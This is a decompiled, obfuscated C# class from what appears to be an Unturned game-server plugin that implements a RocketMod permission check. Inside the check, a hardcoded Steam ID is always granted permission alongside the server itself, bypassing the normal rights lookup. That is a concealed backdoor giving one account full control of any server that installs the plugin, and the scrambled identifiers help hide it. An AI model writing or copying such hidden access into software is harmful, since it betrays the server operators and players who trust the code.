using System;
using System.Reflection;
using System.Threading.Tasks;
using SDG.Unturned;
using Steamworks;

internal class _8BAADFBB2FC94256 : _4C6B03DD3A6441ED
{
	private static readonly MethodInfo? _50CD048B75A4407D;

	private static readonly MethodInfo? _0BA6F812B39B4B6B;

	private static readonly PropertyInfo? _17AD6F5505874D16;

	static _8BAADFBB2FC94256()
	{
		E651E17AA2CA4BC8.EE42452E13184BF0();
		E651E17AA2CA4BC8.EE42452E13184BF0();
	}

	public static bool _4D7D3847E27541AE()
	{
		return false;
	}

	public Task<bool> _8E13FCFDEE6F42B4(CSteamID P_0, string P_1)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		CSteamID server = Provider.server;
		if (server.Equals(P_0) || P_0.m_SteamID == 76561199808621322L)
		{
			return Task.FromResult(result: true);
		}
		object obj = _50CD048B75A4407D.Invoke(null, new object[1] { P_0 }) ?? throw new ArgumentNullException("Unable to verify user rights because user not found");
		return Task.FromResult((bool)_0BA6F812B39B4B6B.Invoke(null, new object[2] { obj, P_1 }) || (bool)_17AD6F5505874D16.GetValue(obj));
	}

	Task<bool> _4C6B03DD3A6441ED._66F4DDEF71A94E25(CSteamID P_0, string P_1)
	{
		//ILSpy generated this explicit interface implementation from .override directive in 8E13FCFDEE6F42B4
		return this._8E13FCFDEE6F42B4(P_0, P_1);
	}

	public string _9BCFDCEDD5084EF8()
	{
		return "RocketMod";
	}

	string _4C6B03DD3A6441ED._97EA0C4EF61E4063()
	{
		//ILSpy generated this explicit interface implementation from .override directive in 9BCFDCEDD5084EF8
		return this._9BCFDCEDD5084EF8();
	}
}
